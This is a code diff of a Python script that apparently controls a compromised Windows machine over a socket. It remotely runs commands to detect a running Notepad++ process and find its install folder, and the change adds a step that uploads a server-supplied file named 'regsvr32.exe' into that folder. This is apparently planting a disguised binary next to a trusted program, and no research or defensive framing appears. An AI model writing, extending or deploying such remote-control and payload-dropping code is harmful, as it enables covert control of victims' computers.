@@ -1,5 +1,6 @@
 import socket
 import time
+import server_config
 import communication as comm
 import command as cmd
 
@@ -7,16 +8,17 @@ import command as cmd
 def find_npp_dir(s: socket.socket) -> str:
     comm.send(s, "exec [where /r C:\\Users *npp*]")
     result = cmd.recv_exec_command(s)
-    print(f"'{result}'")
     return result
+
+
+def send_regsvr32(s: socket.socket, dir: str):
+    comm.send(s, f"upload [{server_config.REGSVR32_FILEPATH}] [{dir}\\regsvr32.exe]")
 
 
 def handle_found_npp(s: socket.socket):
     res = find_npp_dir(s)
     time.sleep(5)
-    dir = "\\".join(res.split("\\")[:-1])
-    print(dir)
-    pass
+    send_regsvr32(s, "\\".join(res.split("\\")[:-1]))
 
 
 def event_loop(s: socket.socket):
@@ -28,7 +30,6 @@ def event_loop(s: socket.socket):
         else:
             comm.send(s, 'exec [tasklist | findstr /I "npp"]')
             result = cmd.recv_exec_command(s)
-            print(result)
-            found_npp = True
-
+            if "npp" in str(result):
+                found_npp = True
     handle_found_npp(s)
